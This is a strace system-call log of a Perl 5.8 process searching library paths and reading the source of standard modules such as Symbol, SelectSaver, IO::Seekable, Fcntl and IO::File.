12268 07:41:34.894600 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.894613 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.894627 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.894639 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.894653 stat64("/usr/lib/perl5/Symbol.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.894664 stat64("/usr/lib/perl5/Symbol.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.894677 stat64("/usr/share/perl5/Symbol.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.894689 stat64("/usr/share/perl5/Symbol.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.894702 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.894714 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.894727 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.894739 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
12268 07:41:34.894760 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
12268 07:41:34.894774 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bff88) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.894785 _llseek(8, 0, [0], SEEK_CUR) = 0
12268 07:41:34.894806 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
12268 07:41:34.895245 read(8, "", 4096) = 0
12268 07:41:34.895261 close(8)          = 0
12268 07:41:34.895324 stat64("/etc/perl/SelectSaver.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.895340 stat64("/etc/perl/SelectSaver.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.895354 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.895367 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.895381 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.895394 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.895408 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.895420 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.895433 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.895536 stat64("/usr/share/perl5/SelectSaver.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.895577 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.895590 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.895619 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.895631 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
12268 07:41:34.895653 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
12268 07:41:34.895671 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bff88) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.895682 _llseek(8, 0, [0], SEEK_CUR) = 0
12268 07:41:34.895701 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
12268 07:41:34.895827 brk(0x81d6000)    = 0x81d6000
12268 07:41:34.895856 read(8, "", 4096) = 0
12268 07:41:34.895868 close(8)          = 0
12268 07:41:34.896341 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
12268 07:41:34.896992 read(6, "", 4096) = 0
12268 07:41:34.897018 close(6)          = 0
12268 07:41:34.897090 stat64("/etc/perl/IO/Seekable.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.897139 stat64("/etc/perl/IO/Seekable.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.897153 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.897165 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.897179 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.897192 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.897206 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.897217 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.897230 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.897242 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.897255 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.897267 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
12268 07:41:34.897289 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
12268 07:41:34.897304 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c0438) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.897315 _llseek(6, 0, [0], SEEK_CUR) = 0
12268 07:41:34.897333 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
12268 07:41:34.897460 stat64("/etc/perl/Fcntl.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.902836 stat64("/etc/perl/Fcntl.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.902836 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.902836 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.902837 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.902837 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.902837 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.902837 stat64("/usr/lib/perl5/Fcntl.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.902838 stat64("/usr/share/perl5/Fcntl.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.902838 stat64("/usr/share/perl5/Fcntl.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.902838 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.902838 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
12268 07:41:34.902838 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
12268 07:41:34.902839 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bff88) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.902839 _llseek(8, 0, [0], SEEK_CUR) = 0
12268 07:41:34.902839 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
12268 07:41:34.903191 brk(0x81f7000)    = 0x81f7000
12268 07:41:34.903366 read(8, "", 4096) = 0
12268 07:41:34.913549 close(8)          = 0
12268 07:41:34.913670 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
12268 07:41:34.913709 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12268 07:41:34.913745 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
12268 07:41:34.913759 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
12268 07:41:34.913849 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
12268 07:41:34.913867 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d1e000
12268 07:41:34.913880 mmap2(0xb7d21000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7d21000
12268 07:41:34.913896 close(8)          = 0
12268 07:41:34.914193 read(6, "", 4096) = 0
12268 07:41:34.914208 close(6)          = 0
12268 07:41:34.914240 stat64("/etc/perl/IO/File.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914255 stat64("/etc/perl/IO/File.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914268 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914281 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914295 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914307 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914321 stat64("/usr/lib/perl5/IO/File.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914332 stat64("/usr/lib/perl5/IO/File.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914345 stat64("/usr/share/perl5/IO/File.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914357 stat64("/usr/share/perl5/IO/File.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914370 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914382 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
12268 07:41:34.914403 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
12268 07:41:34.914417 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c0438) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.914429 _llseek(6, 0, [0], SEEK_CUR) = 0
12268 07:41:34.914446 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
12268 07:41:34.914744 stat64("/etc/perl/File/Spec.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914760 stat64("/etc/perl/File/Spec.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
